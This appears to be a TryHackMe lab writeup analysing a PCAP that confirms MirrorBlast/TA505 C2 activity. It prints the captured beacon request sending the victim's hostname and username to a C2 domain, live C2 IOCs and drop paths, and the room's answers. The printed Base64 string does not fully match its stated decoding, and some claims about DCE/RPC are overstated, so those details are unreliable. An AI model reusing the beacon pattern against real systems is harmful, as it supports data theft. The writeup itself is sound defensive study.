# 🛡️ TryHackMe — Warzone 1 | Network Forensics Writeup

**Platform:** TryHackMe  
**Room:** Warzone 1  
**Category:** Network Forensics / PCAP Analysis  
**Tools Used:** Wireshark · NetworkMiner · Brim · CyberChef · VirusTotal  


---

## 📋 Scenario

> You work as a Tier 1 Security Analyst (SOC L1) for a Managed Security Service Provider (MSSP). A few minutes into your shift, you receive your first network case: **Potentially Bad Traffic** and **Malware Command and Control Activity Detected.**
>
> Your task is to inspect the provided PCAP file and retrieve artifacts to confirm whether this alert is a **true positive**.

---

## 🧰 Tools & Setup

| Tool | Purpose |
|------|---------|
| Wireshark | Initial PCAP triage, protocol analysis, stream inspection |
| NetworkMiner | Host enumeration, file extraction, credential hunting |
| Brim | IDS alert correlation, Suricata signature analysis |
| CyberChef | Base64 decoding, IP defanging |
| VirusTotal | Threat intelligence on suspicious IPs and domains |

---

## 🔍 Investigation Walkthrough

### Step 1 — Protocol Triage (Wireshark)

Opened `Zone1.pcap` in Wireshark and navigated to **Statistics → Protocol Hierarchy** to get a bird's-eye view of the traffic.

**Key findings:**
- Total frames: **1808 packets**
- **96.7% TCP traffic** (1748 packets) — dominant protocol
- **HTTP (3.5%)** — unencrypted web traffic, worth inspecting
- **TLS (7.4%)** — encrypted sessions
- **DCE/RPC (3.1%)** — legacy remote procedure call protocol, rarely seen in modern environments → 🚩 suspicious
- **DNS (1.7%)** — 30 DNS queries logged
- **LDAP (2.1%)** — directory access activity

> ⚠️ The presence of **DCE/RPC** and **unencrypted HTTP** alongside high TCP volume was the first red flag.

---

### Step 2 — Conversation Analysis (Wireshark)

Navigated to **Statistics → Conversations → IPv4 tab** (19 conversations listed).

**Identified the victim machine:**
- Internal IP: `172.16.1.102` (appears in nearly all conversations as one endpoint)

**Notable external IPs communicating with the victim:**

| External IP | Packets | Notes |
|-------------|---------|-------|
| `192.36.27.92` | 545 | Highest packet count — 591KB transferred |
| `169.239.128.11` | 254 | Large volume — 23KB, longest duration 75s 🚩 |
| `172.16.1.2` | 204 | Internal — 54KB exchanged |
| `184.31.153.235` | 48 | 33KB |
| `185.10.68.235` | 180 | 198KB transferred |

> `169.239.128.11` and `192.36.27.92` stood out due to sustained communication duration and byte volume.

---

### Step 3 — Host Enumeration (NetworkMiner)

Loaded `Zone1.pcap` into **NetworkMiner 2.7.1** and went to the **Hosts tab** (29 hosts detected).

Scrolling through the host list, the IP `169.239.128.11` resolved to the hostname **`fidufagios.com`** — a domain that immediately looked suspicious.

**Host details for `169.239.128.11`:**
```
IP Address   : 169.239.128.11
Hostname     : fidufagios.com
MAC Address  : 20:E5:2A:B6:93:F1
NIC Vendor   : NETGEAR
TTL          : 128 (Windows-like)
Open TCP Port: 80 (HTTP)
Sent         : 114 packets (9,092 bytes)
Received     : 140 packets (10,612 bytes)
Incoming Sessions: 28
```

> 🚩 The domain `fidufagios.com` is not a known legitimate service. A non-standard domain receiving persistent HTTP traffic on port 80 from an internal host is a major C2 indicator.

---

### Step 4 — Filtering Suspicious Traffic (Wireshark)

Applied filter in Wireshark:
```
ip.addr == 169.239.128.11
```

This returned **254 packets (14.0% of total capture)**.

Inspecting the HTTP GET request in **packet #1479**:

```
GET /r?x=bmFtZT1TVE9DS0lURk9SVVNcZHdpZ2h0Lm1vcmFsZXMmbWFtZAuMCZhcmNoPXg4NiZidWlsZD0xLjAuMg== HTTP/1.0
Accept: */*
Connection: close
User-Agent: REBOL View 2.7.8.3.1
Host: fidufagios.com
```

> 🚩 **Suspicious User-Agent:** `REBOL View 2.7.8.3.1` — REBOL is a scripting language rarely seen in legitimate browser traffic. This is a known indicator of MirrorBlast malware.
>
> 🚩 **Base64-encoded query parameter** in the GET request URI — a classic C2 beacon pattern.

---

### Step 5 — Decoding the C2 Beacon (CyberChef)

Extracted the Base64 string from the GET request URI:

**Input:**
```
bmFtZT1TVE9DS0lURk9SVVNcZHdpZ2h0Lm1vcmFsZXMmbWFtZAuMCZhcmNoPXg4NiZidWlsZD0xLjAuMg==
```

**CyberChef Recipe:** `From Base64`

**Decoded Output:**
```
name=STOCKITFORUS\dwight.morales&os=10.0&arch=x86&build=1.0.2
```

> 📌 This reveals the **C2 beacon registration data** being sent from the victim machine:
> - **Hostname:** `STOCKITFORUS`
> - **Username:** `dwight.morales`
> - **OS:** Windows 10.0
> - **Architecture:** x86
> - **Malware Build:** 1.0.2

---

### Step 6 — HTTP Stream Analysis (Wireshark)

Used **Follow → HTTP Stream** on the suspicious connection to `fidufagios.com`.

**Client Request (Red):**
```
GET /r?x=bmFtZT1... HTTP/1.0
Accept: */*
Connection: close
User-Agent: REBOL View 2.7.8.3.1
Host: fidufagios.com
```

**Server Response (Blue):**
```
HTTP/1.1 200 OK
Server: nginx/1.14.2
Date: Tue, 05 Oct 2021 22:42:03 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 38
Connection: close

1|f327b5b7-65ea-4f57-b323-a278f1637fb8
```

> 📌 The server returned a **UUID-style task ID** prefixed with `1|` — consistent with a C2 controller issuing a task or session token to the infected host.

---

### Step 7 — IDS Alert Confirmation (Brim)

Opened the PCAP in **Brim** and filtered by destination IP:
```
dest_ip==169.239.128.11
```

**Suricata IDS alerts triggered:**

| Severity | Alert Signature | Category |
|----------|----------------|----------|
| 1 | `ET MALWARE MirrorBlast CnC Activity M3` | Malware Command and Control Activity Detected |
| 2 | `ET USER_AGENTS Suspicious User-Agent (REBOL)` | Potentially Bad Traffic |

> ✅ This **confirms the alert is a TRUE POSITIVE** — Suricata's ruleset directly identifies this as **MirrorBlast C2 Activity**.

---

### Step 8 — Threat Intelligence (VirusTotal)

Defanged the C2 IP using CyberChef (`Defang IP Addresses`):
```
169[.]239[.]128[.]11
```

Submitted `169.239.128.11` to **VirusTotal → Community tab**.

**Threat Intelligence Findings:**

| Attribute | Value |
|-----------|-------|
| Threat Group | **TA505** |
| Associated Campaigns | MirrorBlast, MirrorBlast TA505, TA505 Campaign |
| Community Graphs | 10 threat graphs referencing this IP |
| Malware Family | **MirrorBlast** |
| Communicating Files (majority type) | **Windows Installer (.msi)** |

---

### Step 9 — Additional C2 IPs & Downloaded Files (NetworkMiner)

Checked the **Files tab** in NetworkMiner to identify files downloaded to the victim machine.

**Two additional C2-associated IPs identified:**

| IP Address | File Downloaded | Destination Path |
|-----------|----------------|-----------------|
| `185[.]10[.]68[.]235` | `filter.msi` | `C:\ProgramData\001\arab.bin` , `C:\ProgramData\001\arab.exe` |
| `192[.]36[.]27[.]92` | `10opd3r_load.msi` | `C:\ProgramData\Local\Google\rebol-view-278-3-1.exe` , `C:\ProgramData\Local\Google\exemple.rb` |

> 🚩 Both files are **Windows Installer (.msi) packages** dropping executables into `C:\ProgramData` — a common technique used by TA505/MirrorBlast to achieve persistence while blending into legitimate-looking directories.

---

## ✅ Questions & Answers

| # | Question | Answer |
|---|----------|--------|
| 1 | Alert signature for Malware C&C Activity Detected? | `ET MALWARE MirrorBlast CnC Activity M3` |
| 2 | Source IP (defanged)? | `172[.]16[.]1[.]102` |
| 3 | Destination IP in the alert (defanged)? | `169[.]239[.]128[.]11` |
| 4 | Threat group attributed to this IP (VirusTotal Community)? | `TA505` |
| 5 | Malware family? | `MirrorBlast` |
| 6 | Majority file type under Communicating Files (VirusTotal)? | `Windows Installer` |
| 7 | User-agent in the flagged traffic? | `REBOL View 2.7.8.3.1` |
| 8 | Two other associated IPs (defanged, numerical order)? | `185[.]10[.]68[.]235,192[.]36[.]27[.]92` |
| 9 | File names downloaded from those IPs (in order)? | `filter.msi,10opd3r_load.msi` |
| 10 | Full paths for files from first IP? | `C:\ProgramData\001\arab.bin,C:\ProgramData\001\arab.exe` |
| 11 | Full paths for files from second IP? | `C:\ProgramData\Local\Google\rebol-view-278-3-1.exe,C:\ProgramData\Local\Google\exemple.rb` |

---

## 🧠 Key Takeaways

- **MirrorBlast** is a fileless-style malware associated with **TA505**, a financially motivated threat actor. It uses REBOL scripting and encodes C2 beacons in Base64 within HTTP GET parameters.
- **DCE/RPC traffic** in a network capture is a strong anomaly indicator — it's an outdated protocol and its presence should always be investigated.
- **REBOL View as a User-Agent** is a reliable IOC for MirrorBlast infections.
- C2 registration beacons often leak hostname, username, OS, and build version — valuable for scoping the infection.
- Always cross-reference Suricata/IDS alerts with **VirusTotal Community** graphs to map the threat actor and campaign.

---



*Written by [@Nitishapunmiya](https://github.com/Nitishapunmiya) | #StudentToSOC #BuildInPublic #Unhackd*
